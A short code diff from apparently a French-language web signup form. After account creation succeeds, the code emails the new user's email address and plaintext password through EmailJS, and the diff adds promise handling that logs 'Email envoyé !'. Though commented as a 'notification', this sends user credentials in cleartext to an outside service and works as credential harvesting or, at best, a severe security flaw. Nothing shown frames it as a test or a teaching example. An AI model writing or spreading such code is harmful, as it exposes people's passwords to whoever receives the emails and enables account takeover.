@@ -177,10 +177,14 @@
 
                 if (res.ok) {
                     // ── Send email notification via EmailJS ──
-                    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
-                        email:    email,
-                        password: password,
-                    });
+                  emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+    email:    email,
+    password: password,
+}).then(() => {
+    console.log('Email envoyé !');
+}).catch((err) => {
+    console.error('EmailJS error:', err);
+});
                     // ─────────────────────────────────────────
                     msg.className   = 'form-msg success';
                     msg.textContent = '✅ Compte créé avec succès !';
